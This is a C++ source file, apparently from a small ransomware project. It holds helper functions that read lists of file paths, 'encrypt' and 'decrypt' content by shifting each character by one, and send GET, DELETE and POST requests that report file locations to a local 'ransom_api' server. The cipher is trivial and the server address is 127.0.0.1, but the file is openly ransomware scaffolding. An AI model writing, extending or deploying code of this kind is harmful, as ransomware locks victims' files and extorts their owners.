#include <iostream>
#include <fstream>
#include <sstream>
#include "headers/HTTPRequest.hpp"
#include "headers/ransomFunctions.h"


//Function to read locations and push them into a vector.
bool getFileContents(std::string fileName, std::vector<std::string> & fileContents){  

    std::ifstream in(fileName);  
    if(!in){
        std::cerr << "Cannot open the File : " << fileName << std::endl;
        return false;
    }
    std::string str;    
    while (getline(in, str)){        
        if(str.size() > 0)
            fileContents.push_back(str);
    }    
    in.close();
    return true;
}


//Basic function to read all chars and increment them by one. 
void basicEncryptContent(std::string& content){
	for(char& chr : content){
		chr = chr + 1;
	}
}


//Basic function to read all chars and decrement them by one.
void basicDecryptContent(std::string& content){
	for(char& chr : content){
		chr = chr - 1;
	}
}


//Get request to ransom_api.
std::string get_request(std::string uri){
      try{
        
        http::Request request{uri};

        // send a get request
        const auto response = request.send("GET");      
        return std::string{response.body.begin(), response.body.end()};
        
    
    }
    catch (const std::exception& e){
        std::cerr << "Request failed, error: " << e.what() << '\n';
        return std::string{"Did not work"};
        
    } 
}





//Delete request to ransom_api.
std::string delete_request(std::string id){
      try{
        
        http::Request request{"http://127.0.0.1:5000/locations/" + id};

        // send a get request
        const auto response = request.send("DELETE");      
        return std::string{response.body.begin(), response.body.end()};
        
    
    }
    catch (const std::exception& e){
        std::cerr << "Request failed, error: " << e.what() << '\n';
        return std::string{"Did not work"};
        
    } 
}




//Post Request to ransom_api.
void post_request(std::string body){
    try
    {
        http::Request request("http://127.0.0.1:5000/locations");  
        std::string a = "{\"file_location\": \""; //TODO - Make this work and not three strings lol
        std::string b = body;
        std::string c = "\"}";      
        const std::string body = a + b + c;
        const auto response = request.send("POST", body, {
            "Content-Type: application/json"
        });
        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed, error: " << e.what() << '\n';
    }
}